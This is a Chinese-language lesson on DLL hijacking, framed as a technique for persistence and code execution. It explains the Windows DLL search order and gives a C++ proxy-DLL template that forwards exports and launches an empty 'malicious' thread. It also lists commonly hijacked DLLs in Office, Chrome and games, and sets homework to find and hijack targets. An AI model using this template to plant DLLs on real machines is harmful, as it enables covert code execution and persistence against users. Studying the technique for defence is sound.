# 课时36：DLL劫持

## 1. 课程目标

深入学习DLL劫持技术，用于持久化和代码执行。

---

## 2. DLL劫持原理

```
程序加载DLL的搜索顺序:
1. 程序所在目录
2. System32
3. System
4. Windows
5. 当前目录
6. PATH环境变量

劫持原理:
在高优先级目录放置同名DLL → 程序会加载我们的DLL
```

---

## 3. 实现代码

### 3.1 代理DLL

```cpp
// proxy.cpp - 代理DLL
#include <windows.h>

// 转发原始DLL的导出函数
#pragma comment(linker, "/export:OriginalFunc1=real.OriginalFunc1")
#pragma comment(linker, "/export:OriginalFunc2=real.OriginalFunc2")

HMODULE hOriginal = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hinstDLL);
        
        // 加载原始DLL
        hOriginal = LoadLibraryW(L"C:\\Windows\\System32\\real.dll");
        
        // 执行恶意代码
        CreateThread(NULL, 0, MaliciousThread, NULL, 0, NULL);
        break;
        
    case DLL_PROCESS_DETACH:
        if (hOriginal) FreeLibrary(hOriginal);
        break;
    }
    return TRUE;
}

DWORD WINAPI MaliciousThread(LPVOID lpParam) {
    // 恶意代码
    return 0;
}
```

### 3.2 查找可劫持的DLL

```cpp
#include <windows.h>
#include <stdio.h>

// 检查程序加载哪些DLL失败
void FindHijackableDLLs(LPCWSTR szExePath) {
    // 使用Process Monitor记录
    // 过滤条件: 
    //   Path ends with .dll
    //   Result is NAME NOT FOUND
    //   Process Name is 目标程序
    
    printf("[*] 使用Process Monitor分析: %ws\n", szExePath);
}
```

### 3.3 自动转发

```cpp
// 使用DEF文件转发
// proxy.def:
/*
LIBRARY proxy
EXPORTS
    Func1 = original.Func1
    Func2 = original.Func2
*/
```

---

## 4. 常见劫持目标

| 程序 | 可劫持DLL | 说明 |
|------|-----------|------|
| 许多程序 | version.dll | 版本信息DLL |
| Office | wwlib.dll | Word组件 |
| Chrome | chrome_elf.dll | Chrome组件 |
| 游戏 | d3d9.dll, d3d11.dll | DirectX |

---

## 5. 课后作业

### 作业1：查找目标（必做）

1. 使用Process Monitor找出可劫持的DLL
2. 记录目标程序和DLL名称

### 作业2：代理DLL（进阶）

1. 创建一个代理DLL
2. 测试劫持效果

---

## 6. 下一课预告

下一课我们将学习隐藏模块技术。
